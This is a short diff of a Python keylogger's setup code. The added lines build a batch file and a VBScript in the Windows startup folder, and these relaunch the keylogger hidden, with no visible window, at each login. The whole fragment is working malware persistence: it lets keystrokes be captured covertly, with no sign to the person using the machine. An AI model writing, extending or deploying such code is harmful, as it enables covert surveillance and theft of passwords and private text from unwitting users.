@@ -26,7 +26,10 @@ if __name__=="__main__":
     ) as l:
         l.join()'''
 
-bat = fr'''"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py'''
+bat = fr'''del "{startup}\log.vbs"
+"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py
+echo set code = CreateObject("WScript.shell")>log.vbs
+echo code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False>>log.vbs'''
 
 vbs = fr'''set code = CreateObject("WScript.shell")
 code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False'''
